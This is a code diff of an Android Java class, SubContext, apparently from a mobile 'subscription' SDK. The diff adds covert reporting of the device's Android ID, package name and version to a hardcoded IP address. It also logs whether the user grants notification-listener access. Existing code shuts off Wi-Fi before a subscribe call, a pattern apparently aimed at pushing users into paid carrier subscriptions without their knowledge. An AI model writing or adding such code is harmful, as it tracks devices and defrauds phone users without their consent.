@@ -8,7 +8,6 @@ import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
-import android.content.pm.PackageInfo;
 import android.net.wifi.WifiManager;
 import android.provider.Settings;
 import android.text.TextUtils;
@@ -35,20 +34,27 @@ public class SubContext {
     private NetworkStateReceiver receiver;
 
 
-    public SubContext(Context context, SubCall subCall) {
-        this.context = context;
-        setSubCall(subCall);
+    private String androidId, packageName, version;
 
-        String version = "";
+    public SubContext(Context context, SubCall subCall) {
+
+        this.context = context;
+        this.androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+        this.packageName = context.getPackageName();
+
 
         try {
-            PackageInfo packageInfo = context.getApplicationContext()
+            version = context.getApplicationContext()
                     .getPackageManager()
-                    .getPackageInfo(context.getPackageName(), 0);
-            version = packageInfo.versionName;
+                    .getPackageInfo(context.getPackageName(), 0).versionName;
         } catch (Exception e) {
             SubLog.e(e);
         }
+
+        SubReport.init("http://54.153.76.222:8081", androidId, packageName, version);
+
+
+        setSubCall(subCall);
 
         SharedPreferences shared = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
 
@@ -96,9 +102,9 @@ public class SubContext {
             @Override
             public void run() {
                 try {
-                    String content = subCall.meta();
+                    String info = SubReport.getReport().info();
 
-                    callBack.callback(content);
+                    callBack.callback(info);
 
                 } catch (Exception e) {
                     SubLog.e(e);
@@ -112,8 +118,6 @@ public class SubContext {
 
         if (subCall != null) {
 
-            final String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
-            final String packageName = context.getPackageName();
 
             SubCallBack<String> subCallBack = new SubCallBack<String>() {
                 @Override
@@ -144,13 +148,13 @@ public class SubContext {
                 public void run() {
                     try {
 
-                        String meta = subCall.meta();
+                        String info = SubReport.getReport().info();
 
-                        if (!StringUtil.isEmpty(meta)) {
+                        if (!StringUtil.isEmpty(info)) {
 
                             //关闭wifi
                             if (wifiStateAndClose()) {
-                                subCall.sub(meta);
+                                subCall.sub(info);
                             }
                         }
 
@@ -268,6 +272,7 @@ public class SubContext {
                     public void onClick(DialogInterface dialog, int id) {
                         startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));
                         SubLog.i("notification permission activity");
+                        SubReport.getReport().i(OPEN_NOTIFICATION);
                     }
                 });
         alertDialogBuilder.setNegativeButton(no,
@@ -275,6 +280,8 @@ public class SubContext {
                     public void onClick(DialogInterface dialog, int id) {
 
                         SubLog.w("cancel notification permission");
+
+                        SubReport.getReport().w("cancel notification permission");
 
 //                        subCall.r().w("cancel of notification authorization");
 
